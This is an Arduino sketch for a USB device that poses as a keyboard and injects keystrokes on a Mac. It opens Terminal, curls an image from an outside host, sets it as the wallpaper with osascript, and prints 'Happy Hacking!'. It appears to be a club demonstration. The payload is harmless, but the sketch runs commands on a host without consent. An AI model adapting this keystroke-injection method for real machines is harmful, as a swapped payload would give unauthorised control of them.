#include "DigiKeyboard.h"

void setup() {
  // Empty setup
}

void loop() {
  DigiKeyboard.delay(1000);
// DigiKeyboard.sendKeyStroke(0);

  // Open Terminal
DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.print("Terminal");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000); // Wait for Terminal to open
  
  // Download the image from the web
  DigiKeyboard.print("curl https://i.postimg.cc/V6xWdCBg/CSCBG.jpg > /Users/Shared/wallpaper.jpg");
  DigiKeyboard.delay(200); // Wait for the download to complete
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  // Change wallpaper using AppleScript
  DigiKeyboard.print("osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"/Users/Shared/wallpaper.jpg\"'");
  DigiKeyboard.delay(2000); // Wait for the command to execute
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Clear the terminal
  DigiKeyboard.print("clear");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500); // Wait for the clear command to execute

  // Echo "Welcome to CSC"
  DigiKeyboard.println("echo 'Welcome to CSC'");
  DigiKeyboard.delay(1000);
  
  // Echo "Happy Hacking!"
  DigiKeyboard.println("echo 'Happy Hacking!'");
  DigiKeyboard.delay(1000);

  
  for(;;) { /*empty*/ } // Loop forever
}